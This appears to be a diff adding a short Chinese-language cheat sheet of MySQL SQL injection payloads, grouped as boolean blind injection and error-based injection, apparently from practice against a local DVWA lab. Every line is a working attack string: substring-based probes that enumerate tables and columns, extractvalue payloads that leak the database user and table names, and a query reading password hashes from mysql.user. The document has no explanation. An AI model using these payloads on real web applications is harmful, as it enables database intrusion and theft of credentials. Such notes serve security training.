@@ -1,0 +1,9 @@
+布尔盲注
+1' and if(substring((select table_name from information_schema.tables where table_schema=database() limit 1),1,1)="g",1,0)#
+1' and if(substring((select column_name from information_schema.columns where table_schema=database() and table_name="users" limit 1),1,1)="u",1,0)#
+
+
+报错注入
+select authentication_string from mysql.user limit 1;
+http://192.168.25.107/dvwa/vulnerabilities/sqli/?id=1%27+and+extractvalue(1,concat(0x7e，(select user()),0x7e))%23&Submit=Submit#
+1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema="dvwa" limit 1,1),0x7e))#
